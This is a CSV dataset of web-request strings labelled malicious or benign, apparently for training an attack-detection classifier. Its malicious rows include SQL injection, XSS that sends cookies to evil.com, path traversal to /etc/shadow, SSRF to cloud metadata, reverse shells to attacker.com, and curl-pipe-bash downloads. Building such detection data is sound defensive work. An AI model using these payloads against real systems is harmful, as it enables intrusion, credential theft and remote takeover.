"text","label"
"endpoint=http://localhost:9200/_cat/indices","1"
"file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"User-Agent: masscan/1.3","1"
"host=`id`","1"
"search=tablet","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"page=29&limit=20","0"
"Authorization: Bearer validtoken503","0"
"url=file:///etc/passwd","1"
"cmd=& whoami","1"
"order_id=ORD-5286 status=confirmed","0"
"user_id=85&action=view","0"
"GET /api/data User-Agent: axios/1.6.0","0"
"url=http://metadata.google.internal","1"
"POST /api/search User-Agent: python-requests/2.31.0","0"
"file=../../.git/config","1"
"POST /api/products User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"GET /server-status HTTP/1.1","1"
"url=http://localhost:8080","1"
"username=root&password=123456","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /health HTTP/1.1","0"
"search=tablet","0"
"user_id=23&action=view","0"
"multiple failed login attempts detected for admin","1"
"user_id=16&action=view","0"
"search=<svg onload=alert(1)>","1"
"DELETE /api/users User-Agent: axios/1.6.0","0"
"url=http://127.0.0.1/admin","1"
"GET /actuator/env HTTP/1.1","1"
"GET /robots.txt scan probe reconnaissance","1"
"url=http://192.168.1.1","1"
"username=root&password=password123","1"
"POST /api/data body=command|| nc -e /bin/sh attacker.com 4444","1"
"username=administrator&password=superman","1"
"repeated authentication failure admin account locked","1"
"GET /health HTTP/1.1","0"
"user_id=104&action=view","0"
"name=Ahmed email=904@mail.com","0"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"url=http://127.0.0.1/admin","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"1' AND 1=1 UNION SELECT 1-- -","1"
"POST /api/data?status=pending&priority=high","0"
"POST /api/login User-Agent: python-requests/2.31.0","0"
"| uname -a","1"
"POST /settings body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"order_id=ORD-6178 status=confirmed","0"
"name=Ahmed email=96@mail.com","0"
"url=http://metadata.google.internal","1"
"category=phones page=5","0"
"GET /health HTTP/1.1","0"
"GET /api/orders User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"limit=20&offset=0","0"
"POST /api/login username=1' OR '1'='1' /* password=test","1"
"username=admin&password=abc123","1"
"user_id=457&action=view","0"
"GET /backup.sql HTTP/1.1","1"
"search=tablet","0"
"<video src=1 onerror=alert(1)>","1"
"POST /api/login username=1' AND SLEEP(5)-- password=test","1"
"search=headphones","0"
"title=""><script>alert(1)</script>","1"
"name=<audio src=1 onerror=alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"POST /settings body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"POST /api/products?q=smartphone&brand=samsung","0"
"DELETE /profile User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"GET /health HTTP/1.1","0"
"POST /api/feedback body=<svg/onload=alert(1)>","1"
"; ls -la","1"
"POST /api/data body=command`curl -s http://attacker.com/shell.sh | bash`","1"
"id=id=1&id=2 UNION SELECT 1,2--","1"
"status=pending&priority=high","0"
"url=http://192.168.1.1","1"
"order_id=ORD-3386 status=confirmed","0"
"GET /server-status HTTP/1.1","1"
"order_id=ORD-8637 status=confirmed","0"
"search=tablet","0"
"order_id=ORD-2233 status=confirmed","0"
"brute force attempt on login endpoint from single ip","1"
"POST /api/login username=1 AND 1=CONVERT(int,@@version)-- password=test","1"
"password spray attack detected multiple users","1"
"Authorization: Bearer validtoken193","0"
"POST /api/orders?status=pending&priority=high","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/login username=1' oR '1'='1 password=test","1"
"page=12&limit=20","0"
"path=....//....//etc/passwd","1"
"GET /health HTTP/1.1","0"
"search=laptop&sort=price","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"order_id=ORD-2414 status=confirmed","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /api/files?name=../../.git/config","1"
"GET /health HTTP/1.1","0"
"username=root&password=123456","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"status=pending&priority=high","0"
"user_id=384&action=view","0"
"POST /api/login username=1'||'1'='1 password=test","1"
"path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"user='; EXEC master..xp_dirtree '\\\\attacker.com\\share'--","1"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"1'; INSERT INTO users VALUES('hacker','pass')--","1"
"Authorization: Bearer validtoken106","0"
"POST /api/users body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"page=35&limit=10","0"
"GET /api/search?q=<svg onload=alert(1)>","1"
"POST /api/login username=' OR 'x'='x password=test","1"
"filename=`curl -s http://attacker.com/shell.sh | bash`","1"
"date=2024-01-15&type=order","0"
"name=<iframe src=javascript:alert(1)>","1"
"url=gopher://127.0.0.1:25/","1"
"Authorization: Bearer validtoken415","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"category=phones page=6","0"
"Authorization: Bearer validtoken474","0"
"cmd=| wget http://attacker.com/shell.sh","1"
"login attempt failed username admin invalid credentials","1"
"GET /health HTTP/1.1","0"
"GET /api/search?q=smartphone&brand=samsung","0"
"search=tablet","0"
"url=http://192.168.1.1","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"file=....//....//etc/passwd","1"
"Authorization: Bearer validtoken298","0"
"1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"GET /health HTTP/1.1","0"
"GET /.env HTTP/1.1","1"
"username=root&password=password","1"
"include=../../../var/www/html/config.php","1"
"order_id=ORD-2567 status=confirmed","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"category=phones page=5","0"
"path=../../.git/config","1"
"../../../../etc/passwd","1"
"GET /api/users?id=1 UNION SELECT 1,2,3--","1"
"search=headphones","0"
"repeated authentication failure admin account locked","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"exec=& net user hacker Password1 /add","1"
"POST /api/products body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"username=root&password=1234567890","1"
"Authorization: Bearer validtoken136","0"
"search=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"user_id=247&action=view","0"
"multiple failed login attempts detected for admin","1"
"GET /wp-admin HTTP/1.1","1"
"GET /api/data/4341","0"
"GET /health HTTP/1.1","0"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"host=| cat /etc/passwd","1"
"GET /health HTTP/1.1","0"
"GET ..%2F..%2F..%2Fetc%2Fpasswd","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"multiple failed login attempts detected for admin","1"
"POST /api/data body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"url=gopher://127.0.0.1:25/","1"
"PUT /api/products User-Agent: python-requests/2.31.0","0"
"PUT /settings User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"POST /api/login username=1 AND SLEEP(5)-- password=test","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-9475 status=confirmed","0"
"search=tablet","0"
"repeated authentication failure admin account locked","1"
"url=http://10.0.0.1","1"
"ping=& whoami","1"
"order_id=ORD-6987 status=confirmed","0"
"POST /api/data body=command; python -c 'import socket,subprocess'","1"
"GET /api/files?name=../../../etc/shadow","1"
"search=laptop","0"
"username=admin&password=password123","1"
"order_id=ORD-9369 status=confirmed","0"
"GET /api/products/2346","0"
"status=pending&priority=high","0"
"filename=`id`","1"
"name=Ahmed email=424@mail.com","0"
"order_id=ORD-7416 status=confirmed","0"
"user='; WAITFOR DELAY '0:0:5'--","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"Authorization: Bearer validtoken174","0"
"PUT /dashboard User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"name=<img src=`javascript:alert(1)`>","1"
"order_id=ORD-7307 status=confirmed","0"
"GET /health HTTP/1.1","0"
"page=29&limit=10","0"
"user_id=341&action=view","0"
"title=<audio src=1 onerror=alert(1)>","1"
"order_id=ORD-1401 status=confirmed","0"
"POST /api/login username=' OR ''=' password=test","1"
"POST /dashboard?search=laptop&sort=price","0"
"login attempt failed username admin invalid credentials","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/search/3110","0"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /health HTTP/1.1","0"
"limit=20&offset=0","0"
"GET ../../.git/config","1"
"POST /settings User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"search=laptop","0"
"POST /api/login username=1 UNION SELECT user(),database()-- password=test","1"
"order_id=ORD-9310 status=confirmed","0"
"repeated authentication failure admin account locked","1"
"category=audio page=5","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /api/swagger.json HTTP/1.1","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"url=http://localhost:8080","1"
"host=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"GET /health HTTP/1.1","0"
"PUT /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"cmd=; python -c 'import socket,subprocess'","1"
"category=phones page=6","0"
"GET /api/search User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"1'%09OR%091=1--","1"
"category=laptops page=5","0"
"DELETE /api/search?date=2024-01-15&type=order","0"
"ping=; python -c 'import socket,subprocess'","1"
"GET /config.php HTTP/1.1","1"
"username=admin&password=password","1"
"name=%3Cscript%3Ealert(1)%3C/script%3E","1"
"POST /api/login body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/users?id=admin'--","1"
"url=http://localhost:8080","1"
"GET /health HTTP/1.1","0"
"GET ../../../../var/log/apache2/access.log","1"
"url=http://localhost:8080","1"
"exec=$(curl -s http://attacker.com/shell.sh)","1"
"username=user&password=password123","1"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"PUT /api/data User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"POST /api/data body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /server-status HTTP/1.1","1"
"DELETE /api/orders?search=laptop&sort=price","0"
"description=<img src=`javascript:alert(1)`>","1"
"filename=|| nc -e /bin/sh attacker.com 4444","1"
"GET /api/files?name=../../.git/config","1"
"filename=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"order_id=ORD-2236 status=confirmed","0"
"file=/etc/passwd%00","1"
"message=<img src=`javascript:alert(1)`>","1"
"php://filter/convert.base64-encode/resource=config.php","1"
"Authorization: Bearer validtoken377","0"
"Authorization: Bearer validtoken917","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /settings body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"search='; EXEC master..xp_dirtree '\\\\attacker.com\\share'--","1"
"ping=`curl -s http://attacker.com/shell.sh | bash`","1"
"password spray attack detected multiple users","1"
"url=http://metadata.google.internal","1"
"category=laptops page=10","0"
"GET /api/files?name=..%2F..%2F..%2Fetc%2Fpasswd","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=10&limit=50","0"
"filename=; python -c 'import socket,subprocess'","1"
"POST /dashboard body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"title=<ScRiPt>alert(1)</ScRiPt>","1"
"name=<img src=x onerror=alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Lina email=998@mail.com","0"
"username=root&password=abc123","1"
"POST /profile?status=pending&priority=high","0"
"POST /api/login User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"POST /api/search body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"| uname -a","1"
"POST /api/orders?status=pending&priority=high","0"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"user_id=389&action=view","0"
"path=../../../../etc/shadow","1"
"PUT /api/orders?user=ahmed&filter=active","0"
"POST /profile?id=123&format=json","0"
"cmd=$(whoami)","1"
"GET /api/users?id=' OR 'x'='x","1"
"search=phone","0"
"GET /server-status HTTP/1.1","1"
"brute force attempt on login endpoint from single ip","1"
"url=dict://127.0.0.1:11211/","1"
"search=headphones","0"
"order_id=1' OR 0x31=0x31--","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"name=Omar email=522@mail.com","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"page=34&limit=50","0"
"category=electronics&page=1","0"
"GET /api/orders/358","0"
"GET /health HTTP/1.1","0"
"path=/etc/passwd%00","1"
"password spray attack detected multiple users","1"
"category=phones page=10","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"url=dict://127.0.0.1:11211/","1"
"GET /api/login/460","0"
"url=http://localhost:8080","1"
"POST /api/feedback body=<img src=`javascript:alert(1)`>","1"
"status=pending&priority=high","0"
"search=headphones","0"
"PUT /api/data?id=123&format=json","0"
"GET /api/orders/5861","0"
"GET /console HTTP/1.1","1"
"url=dict://127.0.0.1:11211/","1"
"page=41&limit=10","0"
"url=http://metadata.google.internal","1"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"page=33&limit=50","0"
"exec=& whoami","1"
"Authorization: Bearer validtoken245","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /dashboard?q=smartphone&brand=samsung","0"
"url=http://10.0.0.1","1"
"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"category=audio page=10","0"
"Authorization: Bearer validtoken235","0"
"user_id=49&action=view","0"
"search=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"category=laptops page=3","0"
"url=http://metadata.google.internal","1"
"&#60;script&#62;alert(1)&#60;/script&#62;","1"
"url=file:///etc/passwd","1"
"brute force attempt on login endpoint from single ip","1"
"order_id=ORD-4649 status=confirmed","0"
"User-Agent: Nmap Scripting Engine","1"
"Authorization: Bearer validtoken817","0"
"Authorization: Bearer validtoken112","0"
"../../../../etc/shadow","1"
"host=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"username=user&password=admin","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"username=root&password=batman","1"
"category=phones page=8","0"
"POST /api/products body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"url=http://192.168.1.1","1"
"GET /health HTTP/1.1","0"
"order_id=ORD-7180 status=confirmed","0"
"Authorization: Bearer validtoken303","0"
"Authorization: Bearer validtoken304","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"POST /api/login User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"filename=| cat /etc/passwd","1"
"username=admin'--","1"
"GET /api/orders User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /phpmyadmin HTTP/1.1","1"
"id=') OR ('1'='1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-5564 status=confirmed","0"
"date=2024-01-15&type=order","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"POST /api/feedback body=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"order_id=ORD-7541 status=confirmed","0"
"page=36&limit=10","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"status=pending&priority=high","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"comment=""><script>alert(1)</script>","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /profile/8520","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"username=admin'--","1"
"GET /health HTTP/1.1","0"
"exec=$(curl -s http://attacker.com/shell.sh)","1"
"title=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /dashboard/6116","0"
"category=phones page=2","0"
"exec=|| nc -e /bin/sh attacker.com 4444","1"
"User-Agent: Nmap Scripting Engine","1"
"user=' OR ''='","1"
"; cat /etc/shadow","1"
